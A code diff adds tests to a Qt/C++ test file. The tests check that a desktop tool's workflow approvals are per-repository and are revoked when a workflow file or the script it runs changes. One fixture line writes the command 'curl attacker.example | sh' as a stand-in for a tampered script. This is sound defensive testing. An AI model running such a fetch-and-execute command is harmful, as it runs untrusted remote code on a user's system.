@@ -9,6 +9,7 @@
 #include <QFileInfo>
 #include <QHash>
 #include <QJsonDocument>
+#include <QSettings>
 #include <QTemporaryDir>
 
 #include <cstdio>
@@ -438,6 +439,62 @@ int main(int argc, char **argv)
         check(runner.start(off, QStringLiteral("a/b"), 0, QString(), QString(), QString(), &startError).isEmpty() &&
                   startError.contains(QStringLiteral("turned off")),
               "a workflow that is turned off does not run");
+    }
+
+    {
+        QTemporaryDir checkout;
+        QTemporaryDir settingsDir;
+        QSettings settings(QDir(settingsDir.path()).filePath(QStringLiteral("approvals.ini")),
+                           QSettings::IniFormat);
+        const QString repo = QStringLiteral("stranger/tools");
+        const QString path = QDir(checkout.path()).filePath(kFolder + QStringLiteral("/hourly.json"));
+        const QString scriptPath = QDir(checkout.path()).filePath(QStringLiteral(".forkmesh/shortcuts/run.sh"));
+        QJsonObject file = Workflow{}.toJson();
+        file.insert(QStringLiteral("id"), QStringLiteral("hourly"));
+        file.insert(QStringLiteral("name"), QStringLiteral("Hourly"));
+        file.insert(QStringLiteral("nodes"),
+                    QJsonArray{node(QStringLiteral("when"), kSchedule, QStringLiteral("Hourly"),
+                                    {{QStringLiteral("mode"), QStringLiteral("hourly")},
+                                     {QStringLiteral("active"), true}}),
+                               node(QStringLiteral("run"), kShortcut, QStringLiteral("Run"),
+                                    {{QStringLiteral("file"), QStringLiteral("run.sh")}})});
+        file.insert(QStringLiteral("connections"),
+                    QJsonArray{edge(QStringLiteral("when"), QStringLiteral("run"))});
+        check(writeJson(path, file), "the approval fixture workflow is written");
+        const auto writeScript = [&scriptPath](const QByteArray &bytes) {
+            QDir().mkpath(QFileInfo(scriptPath).absolutePath());
+            QFile script(scriptPath);
+            return script.open(QIODevice::WriteOnly | QIODevice::Truncate) && script.write(bytes) == bytes.size();
+        };
+        check(writeScript("echo hello\n"), "the approval fixture script is written");
+
+        check(!isApproved(settings, repo, checkout.path(), path),
+              "a workflow committed in a checkout is not approved until the user approves it");
+        const QString shown = approvalDigest(checkout.path(), path);
+        check(!shown.isEmpty() && approve(settings, repo, checkout.path(), path, shown) &&
+                  isApproved(settings, repo, checkout.path(), path),
+              "approving the file the user saw lets it run");
+        check(!isApproved(settings, QStringLiteral("someone/else"), checkout.path(), path),
+              "an approval belongs to one repository");
+
+        QJsonObject counted = file;
+        counted.insert(QStringLiteral("updatedAtMs"), 1234);
+        check(writeJson(path, counted) && isApproved(settings, repo, checkout.path(), path),
+              "bookkeeping the desktop writes does not ask again");
+
+        check(writeScript("curl attacker.example | sh\n") &&
+                  !isApproved(settings, repo, checkout.path(), path),
+              "changing a script the workflow runs asks again");
+        check(writeScript("echo hello\n") && isApproved(settings, repo, checkout.path(), path),
+              "restoring the approved script runs again");
+
+        QJsonObject changed = file;
+        changed.insert(QStringLiteral("name"), QStringLiteral("Renamed"));
+        check(writeJson(path, changed) && !isApproved(settings, repo, checkout.path(), path),
+              "any change to the workflow file asks again");
+        check(!approve(settings, repo, checkout.path(), path, shown) &&
+                  !isApproved(settings, repo, checkout.path(), path),
+              "an approval of the file shown earlier does not approve a file changed since");
     }
 
     const QString repositoryRoot =
